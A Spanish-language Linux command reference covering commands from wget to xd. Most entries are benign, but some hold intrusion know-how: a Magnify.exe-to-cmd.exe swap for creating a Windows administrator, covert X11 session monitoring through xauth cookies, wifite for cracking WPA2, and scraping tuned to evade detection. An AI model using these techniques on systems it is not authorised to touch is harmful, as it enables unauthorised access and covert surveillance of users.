$ wget http://www.server.com/login.php --post-data "user=Usuario&password=Contraseña" --save-cookies website.cookie --no-check-certificate -O - > /dev/null
Los argumentos:
	post-data (Especificamos los parámetros a pasarle al script para que nos autentique, en este caso "user" y "password" pero esto varia según la web)
	save-cookies (Indicamos donde guardar el archivo con la cookie, esta cookie será necesaria después para descargar la web con nuestra sesión iniciada)
	no-check-certificate (No comprobar el certificado del servidor con las entidades emisoras de certificados)
	-O - (No generar un archivo de salida ya que solo cogeremos la cookie)
Una vez obtenido el cookie:
$ wget -rkcp  -e robots=off -U Mozilla --limit-rate=80K --random-wait --load-cookies website.cookie --domains server.com --html-extension http://www.server.com
Los argumentos:
	-r (indica que descarge toda la web recursivamente)
	-c (En caso de que queramos retomar la descarga después o si fallase, este parámetro le indica que retome la descarga por donde se interrumpió)
	-e robots=off (Ignorar el archivo robots.txt, si existe en el servidor)
	-U Mozilla (Especifica el User-Agent de Mozilla Firefox en las cabeceras HTTP, útil para ciertas webs que bloquean algunos User-Agents)
	--random-wait (Espera un tiempo aleatorio entre una petición y otra para evitar un posible colapso en la web o ser detectados por algún sistema de seguridad)
	--load-cookies (Carga la cookie de sesión previamente descargada)
	--domains server.com (Indica que solo descarge el contenido de la web especificada y que no siga las urls externas encontradas)
	--html-extension (Guarda todos los documentos en formato HTML)


whatis
Mostrar una breve descripción de un comando.
$ whatis ifconfig


what-patch
Detectar qué sistema de parches utiliza un paquete Debian. what-patch debe ejecutarse desde el directorio raíz del paquete fuente de Debian.
# what-patch -v


whatportis
Comando para buscar a qué número de puerto corresponde un servicio o qué servicio corre por un puerto. Descarga de <https://github.com/ncrocfer/whatportis> o mediante la aplicacion pip [pip install whatportis]
$ whatportis ssh
$ whatportis 5432
$ whatportis mysql --like (Cuando no se conoce exactamente el nombre del servicio)


whatweb
Identifica sitios web: tecnología web, sistemas de gestión de contenidos [CMS], plataformas de blogs, estadística, bibliotecas JavaScript, servidores, dispositivos embebidos, direcciones de correo, versiones, errores SQL.... cuenta con más de 1600 plugins.
$ whatweb -l (Muestra listado de plugins)
$ whatweb -I nginx (Información sobre los plugins relacionados con "nginx")
$ whatweb URL (Uso básico)
$ whatweb -a 3 -v URL (Con un nivel agresivo [a 1: pasivo, a 3: agresivo y a 4: muy agresivo] usando todos los plugins [por defecto], y que muestre toda la información [v])
$ $ whatweb -p nginx URL (Sólo usar un plugin)
$ whatweb 192.168.1.0/24 (Que analice toda una red)


when
Agenda personal.
$ wget http://www.lightandmatter.com/when/when.tar.gz
$ tar -zxvf when.tar.gz
$ cd when_dist
# make install
La primera vez que se lance preguntará donde queremos el directorio personal [por defecto en .when]: pulsar "y" y el editor que queremos [por defecto emacs] yo puse "nano", siempre sin las comillas.
Colocar en .bashrc un alias para que muestre la información en español:
$ nano .bashrc
Añadir la linea:
alias when='when --language=es'
Si no tenemos ninguna entrada en .when/calendar al lanzar:
$ when (Mostrará fecha actual)
Para entrar datos:
$ nano .when/calendar
El formato de los datos es:
2013 mar 19 , Gritar tres veces: Stallman es un genio...
Una vez entrados los datos al lanzar:
$ when
Mostrará la fecha actual y los datos más proximos.
Nota.- La abreviatura de los meses ha de ser en inglés: jan, feb, mar, apr, may,jun, jul, aug, sep, oct, nov, dec.


whereami
Es un conjunto de scripts útiles y un sistema de coordinación para reubicar automáticamente su computadora dentro del entorno de red.
# whereami (forma básica informando las coordenadas)
# whereami -f human (ubicación más entendible)
# whereami -r (todavía más especifica)


whereis
Para encontrar donde se ha instalado un programa, su manual, ...
$ whereis firefox


which
Para encontrar el ejecutable si está en el path
$ which firefox


which.debianutils
Igual que el comando which. Devuelve los nombres de ruta de los archivos, enlaces o ejecutables.
$ which.debianutils liferea


which-pkg-broke
Encontrar qué paquete podría haber roto otro. En algunas distros  puede aparecer como which-pkg-broke-build
$ which-pkg-broke firefox


while
Ejecuta una seria de comandos mientras que una determinada condicion sea cumpla. Algunos scripts ilustrativos:
1.-
	#!/bin/bash
	RESPUESTA=s
	while [ $RESPUESTA = s ]
	do
		echo "Introducir nombre: "
		read NOMBRE
		echo "Hola $NOMBRE"
		echo
		echo "¿Desea continuar? (s/n)"
		read RESPUESTA
	done
2.-
	#!/bin/bash
	while [ "$OPCION" != 5 ]
	do
		echo
		echo "[1] Listar directorio"
		echo "[2] Directorio donde te encuentras"
		echo "[3] fecha de hoy"
		echo "[4] Usuarios conectados"
		echo "[5] Salir"
		echo
		read -p "Ingrese una opción: " OPCION
		echo
		case $OPCION in
			1) ls;;
			2) pwd;;
			3) date +%D ;;
			4) who;;
			5);;
			*) echo "Opción ingresada no valida, intentelo de nuevo";;
		esac
	done
	exit 0
3.-
	#!/bin/bash
	# imprimir números del 1 al 10
	LIMITE=10
	a=1
	while [ "$a" -le $LIMITE ]
	do
	  echo "$a "
	  let "a+=1"
	done
4.-
Leer un archivo linea a linea:
	#!/bin/bash
	while read linea
	do
	   echo "---> $linea "
	done < archivo.txt
5.-
Especificando un separador [:]
	#!/bin/bash
	while IFS=: read user pass uid gid full home shell
	do
	echo -e "$full :\n\
		    Pseudo : $user\n\
		    UID :\t $uid\n\
		    GID :\t $gid\n\
		    Home :\t $home\n\
		    Shell :\t $shell\n\n"
	done < /etc/passwd
6.-
Leer un archivo pasado como parámetro, descartar las lineas en blanco y colorear alternativamente las siguientes en amarillo y rojo.
	#!/bin/bash
	COLOR=1
	while read linia
	do
		if [ -z "${linia}" ]
		then
			continue
		fi
		if [ $COLOR -eq 0 ]
		then
			echo -e "\e[1;30;41m$linia\033[0m" #VERMELL - 0
			COLOR=1
		else
			echo -e "\e[1;30;43m$linia\033[0m" #GROC - 1
			COLOR=0
		fi
	done < $1


whiptail
Muestra ventanas en consola. Parecido a dialog con menos opciones.


who
[whowatch]. Muestra información sobre los usuarios que están conectados al equipo.
$ who -b (Tiempo desde el último arranque del sistema)
$ who -d (Procesos truncados)
$ who -r (Informa del runlevel activo)
$ who am i (usuario, número de terminal y fecha de entrada en dicha terminal)


whodepends
Comprueba qué paquetes dependen de un paquete dado y da los nombres y direcciones de correo electrónico de todos sus mantenedores
$ whodepends firefox
$ whodepends nano


who-permits-upload
Busca los permisos de carga del Mantenedor de Debian (DM) proporcionados desde ftp-master.debian.org y los analiza de forma legible por humanos. La herramienta puede buscar por nombre de DM, patrocinador (la persona que otorgó el permiso) y por paquete.
$ who-permits-upload -s sponsor "Marco d'Itri"
$ who-permits-upload -s uid whois
$ who-permits-upload apache2


who-uploads
Identifica las tres últimas versiones descargadas del paquete dado. Los cargadores se identifican utilizando sus llaves gpg o gpg2; la instalación de una versión reciente del paquete debian-keyring debería proporcionar la mayoría de las claves requeridas. Debido a que el PTS usa paquetes fuente, ha darse los nombres del paquete fuente, no los nombres del paquete binario.
$ who-uploads -M 5 emacs25 (dando la fecha de cada versión y de las últimas 5 del paquete mencionado)
$ who-uploads --no-date firefox (sin mencionar la fecha del paquete firefox)


whoami
Muestra el usuario con el que estamos. Misma salida que id -un [ver]
$ whoami


whois
Conocer los datos del registro de un dominio. Especificar sin las www
$ whois todo-linux.com


wicd-curses
conexiones a una red inalambrica.
$ wicd-curses
Si hay redes libres seleccionar la red y presionar la tecla C. Si existen redes  con seguridad habilitada, situarnos en la red con la que deseemos conectar, y presionar la tecla -> [la flecha derecha]. Mostrará otro menu donde ingresar  protocolo de seguridad y clave.


wicd-gtk
Applet de wicd para el area de notificación (tray)
$ wicd-gtk -a


wifite
[aircrack-ng reaver]. Crackear redes wpa2 con el "Wi-fi protected setup" activo.
# wifite (Inicia el proceso)


wikipedia2text
Consultar en la wikipedia y ver la consulta por terminal o por el navegador.
$ wikipedia2text -b chromium -l es emacs (ver la consulta con chromium y en español)
$ wikipedia2text -l es girona (ver la consulta por terminal)
$ wikipedia2text -o -l es emacs (por navegador de terminal)
$ wikipedia2text -r -l es (ver consultar aleatorias de la wikipedia en español)


wikit
Buscador en la wikipedia por teminal.
$ wikit -l es mostaza (Buscar mostaza en la wikipedia en castellano)
$ wikit -b linux (abrir el articulo de la definición en el navegador)
$ wikit -d linux (abrir en el navegador la página de parecidos)


windows
1.-
Redimensionar desde windows:
Botón derecho en: Mi PC \ Administrar o Inicio \ Panel de control \ Herramientas administrativas \ Administracion De Equipos. Clicar con el boton derecho sobre la particion que queremos modificar. Aparecen dos opciones:
* Extend Volume
* Shirnk Volume
La opcion de Shrink Volume es la que nos permite liberar espacio de la partición. Windows moverá los archivos necesarios en su interior. Igualmente informá del tamaño maximo que puede liberar con garantias de integridad de datos. El espacio libre podremos particionarlo posteriormente usando herramientas clásicas como gparted.
2.-
Re-dimensionar desde Linux:
Cuando a gparted le resulta imposible re-dimensionar particiones ntfs [con vista, por ejemplo] usaremos un Live con las herramientas ntfsprogs [puppy, entre otras]. Previamente habremos desfragmentado la partición win y, si procede, reparados posibles errores de disco desde la consola del sistema [cmd] lazando chkdsk /c
Arrancado el Live, averiguamos el nombre de la partición:
# fdisk -l | grep NTFS
Si no hemos lanzado chkdsk en win, con linux podemos reparar los posibles errores con:
# ntfsfix /dev/sdax
Comprobar si detecta correctamente la partición win:
# sudo ntfsresize -P -i -f -v /dev/hda1 --ad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
NTFS volume version: 3.1
...
Ordinary : 55549 MB 49454
You might resize at 25961267200 bytes or 25962 MB (freeing 32608 MB).
Please make a test run using both the -n and -s options before real resizing!
Indica cuánto podemos redimensionar (25962 MB) y cuánto espacio quedaría libre (32608 MB).Suponemos que deseamos dejar el sistema de ficheros en 29055000000 by (29055 MB). Primero lo simulamos (recomendable realizar la prueba varias veces):
# ntfsresize -f -s 29055000000 -n /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
NTFS volume version: 3.1
...
ERROR: Extended record needed (1096 > 1024), not yet supported!
Please try to free less space.
Indica que no se ha dejado suficiente espacio para desplazar los datos.
dejamos más espacio:
# ntfsresize -f -s 31055000000 -n /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)
Device name : /dev/hda1
...
Updating Boot record …
The read-only test run ended successfully.
La simulación sale correcta, procedemos a aplicarla quitando el parámetro -n
# ntfsresize -f -s 31055000000 /dev/hda1 --bad-sectors
ntfsresize v2.0.0 (libntfs 10:0:0)Device name : ...
...
Syncing device …
Successfully resized NTFS on device ‘/dev/hda1′.
3.-
Crear un usuario administrador en windows [7, server 2008...]
Arrancar con un Live-cd y montar la partición win.
Entrar en C:\Windows\System32
Borrar el archivo Magnify.exe
Copiar el fichero cmd.exe y renombrar como Magnify.exe
Reiniciar para que arranque Windows.
Ejecutar la herramienta de lupa y arrancará una ventana de comandos como usuario administrador
Crear un usuario administrador:
net user /add admin
net localgroup administrators admin /add
net user admin *
Reiniciar win y entrar con el usuario creado.


wine
Ejecuta programas de Windows en Linux
$ wine programa.exe
$ winecfg (Abre la ventana de configuración)
1.-
En distros de 64 bits, ejecutar wine en modo 32 bits
Se debe eliminar o mover la carpeta ~/.wine y recrearla de nuevo. Primero se realiza un export de la variable WINEARCH en la terminal
$ export WINEARCH=win32
Y luego se ejecuta wine de nuevo
$ wine programa32bits.exe


winetricks
Herramienta para instalar librerias y complementos para wine
$ winetricks (ejecuta la interfaz gráfica del programa)
$ winetricks corefonts (Instala fuentes como Arial y Verdana)
Más referencias de winetricks aqui: <http://wiki.winehq.org/winetricks>


wipe
Borrado de archivos, directorios, particiones o discos de forma segura.
$ wipe archivo (Sobreescribiendo 34 veces el espacio)
$ wipe -fq (Sin pedir confirmación y sólo reescribiendo 4 veces)
$ wipe -rq -Q 10 -i -c DIR/ (Que suprima los subdirectorios [r], que haga 10 pasadas y no sólo 4 [-q -Q 10], que muestre detalles [-i] y por si tienen permisos que chmod entre en acción [c]


wird
Frontend basado en ncurses para recordatorios, cálculo de fechas, fases lunares, salida y puesta del sol, calendario hebreo, alarmas, mensajes multilingües y manejo adecuado de los días festivos. Muestra en una tabla de tiempo navegable junto con un calendario y permite al usuario crear nuevos recordatorios con o sin tiempo.
$ wird


wkhtmltopdf
Pasar una página web o un archivo html a pdf
$ wkhtmltopdf tuxapuntes.com tuxapuntes.pdf
$ wkhtmltopdf -O Landscape -s A4 file.html file.pdf (Apaisado y A4)
Algunas opciones:
-O Portrait	(Vertical)
-s A3


wmbattery
Pequeña ventana que se abre en el escritorio y muestra la carga de la bateria.
$ wmbattery


wmcalclock
Abre una pequeña ventana en el escritorio y muestra calendario, hora de Greenwich, hora sideral media de Greenwich y hora sideral local.
$ wmcalclock -24 -S (Formato 24 horas y sin mostrar los segundos)


wmclok
Abre una pequeña ventana en el escritorio que muestra calendario en inglés y la hora
$ wmclock -12 -led gold (formato 12 horas y color de la letra dorada)


wmclockmon
Abre una pequeña ventana en el escritorio que muestra un reloj como wmtime, pero con un temporizador de alarma y diferentes estilos.
$ wmclockmon -a 17:33 (Con alarma a las 17'33)


wmclockmon-cal
[wmclockmon]. Pequeña ventana que se abre en el escritorio y muestra el calendario del mes actual
$ wmclockmon-cal


wmcpu
Pequeña ventana que se abre en el escritorio y muestra información sobre la CPU. la memoria, la swap y tiempo de actividad.
$ wmcpu


wmcpuload
Pequeña ventana que se abre en el escritoria y muestra el uso actual de la CPU como valor porcentual y gráfico con una apariencia similar a LCD.
$ wmcpuload -a 50 (Que muestre alarma al llegar a 50% de uso. Por defecto 90)


wmctrl
Interactuar con las ventanas
$ wmctrl -l (Muestra el ID de todas las ventanas)
$ wmctrl -s 2  (Ir al escritorio 3 [la primera es la 0])


wmdate
Pequeña ventana que se abre en el escritorio que puestra ucomo una hoja de calendario en inglés.
$ wmdate


wmdiskmon
Pequeña ventana que se abre en el escritorio que muestra el uso del disco.
$ wmdiskmon


wmfire
Pequeña ventana que se abre en el escritorio que muestra el uso actual de la CPU como un fuego bonito y ardiente.
$ wmfire


wmforkplot
Pequeña ventana que se abre en el escritorio y supervisa la actividad del núcleo y muestra una lista de los procesos que consumen más CPU.
$ wmforkplot


wmfrog
Pequeña ventana que se abre en el escritorio que proporciona informes meteorológicos. Precisa configurar la estación de la que se quiere monitorizar el tiempo [FAA, WMO]
$ wmfrog -s FAA -delay 10 (usando FAA y que se actualice cada 10 minutos. Por defecto 15)


wmfsm
Abre una pequeña ventana en el escritorio que muestra hasta qué punto se utilizan los sistemas de archivos montados.
$ wmfsm


wmgtemp
Pequeña ventana que se abre en el escritorio y muestra gráficamente las temperaturas de CPU y SYS de las placas base compatibles con lm_sensors. Para hacer que wmgtemp funcione precisa configurar lm_sensors.
$ wmgtemp


wmhdplot
Abre una pequeña ventana en el escritorio y monitore los discos duros a base de estímulos visuales cada vez que su /dev/hdx escribe o lee algo.
$ wmhdplot


wmifinfo
Abre una pequeña ventana en el escritorio que muestra información básica de red para todas las interfaces disponibles. Muestra la dirección IP, la máscara de red, la puerta de enlace y la dirección MAC de forma similar a ifconfig.
$ wmifinfo


wmifs
Pequeña ventana que se abre en el escritorio y monitorea todas las interfaces de red.
$ wmifs


wmitime
Muestra en una pequeña ventana en el escritorio una aplicación de base reloj, que muestra la hora estándar y la fecha. La característica única es que también puede mostrar el tiempo de Internet con notación @TIME.
$ wmitime


wmload
Muestra en una pequeña ventana en el escritorio una representación gráfica del núcleo/sistema y estadísticas.
$ wmload


wmmatrix
Muestra matrix en una pequeña ventana en el escritorio.
$ wmmatrix


wmmemload
Muestra en una pequeña ventana en el escritorio la memoria actual y el uso de intercambio como un valor porcentual.
$ wmmemload


wmmisc
Monitorea la cantidad de usuarios conectados, total de procesos, cantidad de procesos en ejecución y promedio de carga del sistema. Abre una pequeña ventana en el escritorio.
$ wmmisc


wmmon
Monitor de la carga de la CPU en tiempo real, así como la carga promedio del sistema y también brinda algunas características adicionales. Abre una pequeña ventana en el escritorio.
$ wmmon -s (Empezar en modo información del sistema, uso de la memoria, uso de intercambio y el tiempo de funcionamiento)


wmnd
Muestra un gráfico de tráfico entrante/saliente, indicadores de actividad para rx/tx y velocidad actual máxima para rx/tx en bytes o paquetes.
$ wmnd (uso básico)
$ wmnd -I eth0 (especificando interfaz de red)


wmshutdown
Aplicación de muestra en el escritorio un aplet que permite apagar o reiniciar la máquina simplemente haciendo clic y confirmando.
$ wmshutdown


wnpp-alert
Comprobar si hay paquetes instalados en adopción o huérfanos. Descarga las listas de paquetes que han quedado huérfanos (O), están en adopción (RFA), o que el responsable ha pedido ayuda (RFH) de las páginas web de WNPP y los muestra en una lista.
$ wnpp-alert


wnpp-check
Comprueba si un paquete se está empaquetando (ITPed) o si se ha solicitado un paquete (RFPed) desde el sitio web de WNPP <https://www.debian.org/devel/wnpp> y enumera los paquetes que se incluyen en la línea de comando que aparecen en esas listas.
$ wnpp-check paquete


wodim
Grabación de cds i dvds
$ wodim -v -eject dev=/dev/cdrw -data imagen.iso  (Grabar una iso)
$ wodim -v -eject dev=/dev/dvd -data imagen.iso  (Grabar imagen en un DVD)
$ wodim -v -eject blank=fast dev=/dev/cdrw  (Borrar un CD)


wondershaper
Limitar el ancho de banda de la conexion de una red. Prioriza telnet y ssh sobre tráfico web, y este sobre las descargas de datos. Para limitar aplicaciones ver trickle.
# wondershaper eth0 (Muestra el estado de la red eth0)
# wondershaper eth0 1024 512 (limita la conexión a 1024 kbps de bajada y 512 kbps de subida)
# wondershaper clear eth0  (Elimina los ajustes realizados en la red especificada)


wordplay
Buscador de anagramas o sea buscar una palabra o frase hecha al transponer las letras de otra palabra o frase. El idioma empleado es el inglés. Cada letra del anagrama debe aparecer con la misma frecuencia que en la cadena original.
$ wordplay university (Anagrama de la cadena "university")
$ wordplay university -lx (lista las palabras que se pueden deletrear usando las letras "university")
$ wordplay university -n3m8 (Anagrama de la cadena "university" usando palabras de más de 3 letras y menos de 8)
$ wordplay university -ld3m10 -f /usr/share/dict/words (Imprimir anagramas que contengan hasta 3 palabras, sin considerar ninguna palabra de más de 10 caracteres y utilizando el archivo "/usr/share/dict/words" en lugar de "words721.txt" que es el por defecto)
$ wordplay university -slx (Imprime la lista de palabras de la cadena "university". La salida consistirá sólo en las palabras [s])


wormhole
[magic-wormhole]. Envio de archivos o directorios entre computadoras usando un código de un solo uso. la máquina emisora genera y muestra el código, que debe ser escrito en la máquina receptora. El ejemplo que sigue es sacado de la pàgina del proyecto <https://github.com/warner/magic-wormhole>
En la máquina emisora:
	$ wormhole send README.md
	Sending 7924 byte file named 'README.md'
	On the other computer, please run: wormhole receive
	Wormhole code is: 7-crossover-clockwork
En la máquina receptora:
	$ wormhole receive
	Enter receive wormhole code: 7-crossover-clockwork
	Receiving file (7924 bytes) into: README.md
	ok? (y/n): y
	Receiving (->tcp:10.0.1.43:58986)..
	100%|===========================| 7.92K/7.92K [00:00<00:00, 120KB/s]
	Received file written to README.md


worms
Muestra gusanos en la terminal.
$ worms -d 200 -n 4 -l 4 (lento [-d] por defecto 0. 200 máximo, mostrando 4 gusanos [-n] Por defecto 3 y con longitud de 4 caracteres [-l]. Por defecto 16.


wput
Subir ficheros a un servidor ftp.
$ wput file ftp://USER:PASS@192.168.1.10/home/usuario/dir/
$ wput *.txt ftp://USER:PASS@host.com/home/usuario/ (Subir todos los .txt del directorio local al host remoto)


write
Enviar mensajes a la terminal de usuarios conectados remotamente a nuestra máquina.
$ write usuario /dev/pts/15  (Iniciar el promt para la comunicación con el usuario de la terminal número 15. Este a su vez, para responder, debe lanzar write hacia la consola del otro usuario)


wspanish
El paquete contiene una lista alfabética de algunas palabras en español. No pretender ser una lista de palabras completa y muchas palabras No están completamente expandidas. Se almacena en el directorio /usr/share/dict/


wttr
Servicio de predicción meteorológica y fuentes de datos para la información del pronóstico del tiempo. Admite varios métodos de presentación (curl, httpie, wget, HTML para navegadores, png...)
$ curl wttr.in/Figueras,Gerona (especificando ciudad y provincia)
$ curl -H 'Accept-Language: es' -s wttr.in/figueras,girona | sed -n '1,7p' (solo lo básico de una ciudad y en español)
$ curl -H 'Accept-Language: es' -s wttr.in/sant+joan+de+les+abadesses,girona (para una ciudad con varias palabras)
$ curl wttr.in/Moon?lang=es (ver estado de la luna y en español)
$ curl wttr.in/~Eiffel+Tower (especificar algo que no es una población)
$ curl wttr.in/@lapipaplena.org (la situación de un dominio)
$ wget wttr.in/Figueras,Gerona.png (bajar una imagen de la población seleccionada)


wuzz
Herramienta interactiva para generar y enviar solicitudes HTTP, así como para ver las respuestas. En lugar de tener que especificar los encabezados TTP, parámetros, cuerpo, etc. en la línea de comandos, se puede usar un CUI (interfaz de usuario de consola) simple e intuitivo.
$ wuxx (entrar en el prompt)
Movimiento por la pantalla:
	* Ctrl+R - Enviar solicitud.
	* Ret - Enviar la solicitud desde la URL de la ventana solamente.
	* Ctrl+C - Salir.
	* Ctrl+K , Mayús+Tab - Vista anterior.
	* Ctlr+J , Tab - Siguiente vista.
	* Ctrl+H , Alt+H Cambiar el historial.
	* flecha abajo - Bajar una línea de la vista.
	* flecha arriba - Moverse hacia arriba en una línea de la vista.
	* Bajar página - Bajar una página de la vista.
	* Avanzar página - Mueve hacia arriba una página de la vista.


wuzzah
Programa que escanea selectivamente los registros utmpx de un sistema [donde se almacenan los inicios de sesión, entre otras cosas], vigilando a los que inician y cierran sesión y, realizando acciones personalizables en eventos.
$ wuzzah


wyrd
Aplicación de planificación personal para cálculos de fechas, fases lunares, amanecer/atardecer, calendario hebreo, alarmas, mensajes multilingües y manejo de vacaciones.
$ wyrd


x11vnc
Conexion remota. Comparte la misma ventana abierta. En el cliente: xvncviewer o xtightvnc
En el servidor:
$ x11vnc -storepasswd (Preguntará contraseña y donde guardarla; por defecto en /home/USER/.vnc/passwd)
$ vncpasswd  (otra forma de entrar la contraseña)
$ x11vnc -create  (Abrir nueva sesión)
$ x11vnc -rfbauth /home/USER/.vnc/passwd (Arrancar el server)
$ x11vnc -usepw -display :0  (lo mismo especificando la sesión X a visualizar)
En el cliente:
# xvncviewer IP_servidor
$ killall x11vnc (Matar el servidor)
Otra forma de arrancar el server  y que se ejecute en segundo plano (-bg), contraseña de acceso (-passwd) e interfaz gráfico (-gui):
$ x11vnc -bg -gui -passwd la_que_sea
Se abrirá una pantalla de configuración, en la que podremos configurar las opciones del servidor. Algunas de la pestaña Permissions:
	allow: Lista de IPs (separadas por comas) a las que se permite acceso.
	forever: Que el servidor no cierre al desconectar el cliente
	viewonly: No permitir cambios en el servidor.
1.-
Conexión inversa abriendo vnc desde ssh de forma remota:
$ vncviewer -listen   (en el Pc al cual nos conectaremos)
# x11vnc -connect IP_o_HOST:puerto -display :0 -auth guess
Desde terminal en las X:
$ vncviewer -listen   (en el pc del que nos conectaremos)
Entramos por ssh al remoto de la forma normal [ssh usuario@host] y una vez dentro, lanzamos:
$ x11vnc -connect IP_o_HOST:puerto
Donde la IP_o_HOST es la máquina donde hemos lanzado el vncviewer -listen
2.-
Otra forma de conexión inversa:
Abrir vinagre y en remota/conexiones inversas, clicar las dos casillas (Habilitar conexiones inversas y siempre habilitado) y luego abrir terminal y lanzar:
$ ssh usuario@host_remoto (Realizar la conexión ssh normal)
Y cuando se está en el host_remoto:
$ (DISPLAY=:0 x11vnc -connect host_actual:5500 &)
Nota: los paréntesis son porque al ejecutar una sub-shell interprete todos los comandos como un único comando.


xampp
Gestor de páginas web locales
Para instalar xampp es necesario desinstalar apache porque el paquete ya lo incluye.
Descargar la aplicación de: http://www.apachefriends.org/en/xampp-linux.html
# tar xvfz xampp-linux-1.6.5a.tar.gz -C /opt
# /opt/lampp/lampp start (Arrancar todas las aplicaciones xampp)
Comprobar en el navegador la correcta instalación (http://localhost) y mirar en el apartado seguridad los puntos vulnerables.
# /opt/lampp/lampp security (Para entrar las constraseñas)
La proxima vez que se entre en localhost pedirá el usuario (por defecto lampp) y la contraseña introducida anteriormente.
# /opt/lampp/lampp phpstatus (para saber la versión php)
# /opt/lampp/lampp php5 (activar php 5 o php4)
# /opt/lampp/lampp startssl (arrancar apache con soporte ssl. Para acceder: https://localhost)
Otras opciones:
start / stop / restart arrancar / parar / reiniciar xampp
startapache /stopapache arrancar / parar apache
startmysql / stopmysql arrancar / parar la base de datos mysql
startftp /stopftp arrancar / parar ftp server (user: nobody, password: lampp)
Directorios:
/opt/lampp/htdocs : Directorio donde guardar las páginas que esten online.
/opt/lampp/etc/httpd.conf : configuración de apache.
/opt/lampp/etc/my.cnf : configuración de mysql.
/opt/lampp/etc/php.ini : configuración de php.
/opt/lampp/etc/proftpd.conf : configuración de ftp.
/opt/lampp/etc/phpmyadmin/config.inc.php : configuración de
phpmyadmin
1.-
Activar el protocolo SSL en XAMPP, por defecto deshabilitado.
Copiar los archivos libeay32.dll y ssleay32.dll de la carpeta xampp\php\ en la carpeta xampp\apache\bin\ , sobreescribiendo los existentes.
Editar el fichero php.ini  que puede encontrarse en alguno de los siguienetes directorios:  xampp\apache\bin o xampp\php y descomentar la linea:
extension=php_openssl.dll
En caso de que no aparezca esa línea añadirla final del archivo


xarclock
Reloj invertido [de iquierda a derecha]
$ xarclock -roman -chime -fg white -bg blue -hd red -hl yellow -update 1 -geometry 200x200 (Con los números romanos [roman] en blanco [fg], que marque con un "clin" las medias horas y con dos las horas [chime], fondo azul [bg], manecillas en rojo [hd], borde de las manecillas amarillas [hl], marcando los segundos [update] y geometria 200x200)


xargs
lee y ejecuta los comandos de la entrada estándar cogiendolos como parámetros. Si no se pasa ningún comando, por defecto se usa el comando “echo”. Algunos usos de este comando:
$ ls | xargs rm -fr (elimina todos los archivos del directorio. Se emplea cuando la cantidad de archivos a eliminar desborda el buffer si pretendemos eliminarlos con rm -fr *)
$ ls | xargs -t -i mv {} {}.bak (Renombra todos los archivos del presente directorio añadiéndoles .bak)
$ echo | xargs --show-limits (conocer el límite de argumentos que xargs admite)


xauth
Monitorización de sesiones X11 sin conocimiento del usuario apartir de los cookies que se guardan en el fichero .Xauthority del directorio del usuario que inició la sesión X (o en el indicado por la variable XAUTHORITY). Este fichero sólo tiene permiso de acceso para el usuario y para root. Para visualizar los cookies:
$ xauth list
Pasos para controlar la sesión:
1 Conectar como root al sistema que queremos controlar
2 Averiguar el display en el que está conectado el usuario y poner nuestra variable DISPLAY a ese valor (export DISPLAY=:0). Normalmente será el :0, sí no ver en el directorio /tmp/.X11-unix los displays activos
3 Poner la variable XAUTHORITY igual al nombre del fichero .Xauthority del usuario:
# export XAUTHORITY=/home/usuario/.Xauthority
4. Verificación. Con:
# xauth list
deberíamos ver las cookies del usuario.


xawtv
Ver y grabar canales de televisión y cámaras web. Consta de las siguientes aplicaciones: mtt [visor de teletexto], ntsc-cc, rootv, subtitles, v4lctl y xawtv-remote [Control remoto].
$ xawtv (abrir la ventana y comenzar a mostrar el video del dispositivo de captura de TV configurado, si existe alguno)
$ xawtv -hwscan (lista de dispositivos reconocidos)
$ xawtv -c /dev/video0 (especificar el dispositivo a usar)
$ xawtv -c /dev/video0 -channel 5 (abrir el dispositivo especificado y sintonizar el canal 5)
$ xawtv -grab (capturar un fotograma)
$ xawtv -f (pasar a pantalla completa
$ xawtv -record archivo (grabar la salida de video a un archivo)
$ xawtv -config ~/.xawtv (archivo de configuración)
$ xawtv -channels channels.conf (cargar los canales desde el archivo)


xbacklight
Ajustar el brillo de la pantalla
$ xbacklight -set 100  (la pone al máximo)


xbindkeys
Gestión de atajos de teclado. Archivo de configuración en .xbindkeysrc.
$ xbindkeys -d (Muestra cuales)
$ xbindkeys -k  (dará nombre de la tecla pulsada)
$ xbindkeys -km (Para consultar varias teclas)
Modo de entrar un atajo:
"gnome-terminal"
   Mod4 + t
Abrirá la terminal pulsando las teclas “Win” + “t”


xboxdrv
Comando para arrancar el driver de los mandos (gamepad) para Xbox y Xbox360 (y compatibles). Requiere hacer blacklist del módulo xpad. Se puede hacer sin afectar al sistema haciendo lo siguiente:
# rmmod xpad
También se puede hacer permanente el cambio añadiendo el driver al final del fichero /etc/modprobe.d/blacklist.conf con la línea siguiente: blacklist xpad
# xboxdrv --silent (arrancar en modo silencioso)
# xboxdrv --device-by-id 1234:1234 --type xbox360 (Arranca el driver para un gamepad con un ID específico. Puedes ver la ID ejecutando lsusb)


xclip
Copia al portapapeles la salida de cualquier comando.
$ who | xclip
$ xclip -selection clipboard -o (mostrar el contenido del portapapeles)
$ xclip -o (Lo pegará en la terminal [pst-tty] donde lo lancemos)
$ xclip -i /etc/fstab (copiará el fstab)
$ xclip -o -d :0 wicd(Para pegarlo en las tty)
$ echo "linux es genial" | xclip -selection clipboard (copiar un texto en el portapepeles)
$ xclip -o fichero (Lo pega en fichero)
$ who | xclip -sel clip  (Lo pega en cualquier aplicación de las X)
$ xclip archivo (Enviar el contenido de un archivo al portapapeles)
$ xclip -selection clipboard /dev/null (borrar contenido del portapapeles)


xclock
Reloj para las X.
$ xclock (analogico)
$ xclock -d (digital)


xcwd
Herramienta que abre una terminal de la ventana enfocada. Cambia el directorio de trabajo para la conexión a la ruta solicitada. Si, por ejemplo, tenemos thunar con la dirección /var/www/html/tractatus, y abrimos una terminal y tecleamos:
$ urxvt -cd "$(xcwd)"
Se abrirá otra terminal con la ruta indicada por thunar.


xd
Programa [eXtra fast Directory changer] que se utiliza para cambiar rápidamente entre directorios siempre que se incluya el argumento --input, sinó, solo los muestra.
$ xd /ulb (la "/" indica que partimos del directorio raiz. En el ejemplo podría ser /usr/local/bin)
$ xd .Dl (el "." que partimos del directorio de inicio del usuario. En el ejemplo podría ser ~/Documentos/libros)
$ cd 0le (el "0" indica que partimos del directorio en el que estemos. En el ejemplo, si estamos en ~/Documentos, podría tratarse de libros/emacs)
$ xd --input /ulb (entra en el directorio /usr/local/bin)
Si existen varios con las mismas iniciales mostraría la lista para escoger el número del que corresponda al que queremos.


xdg
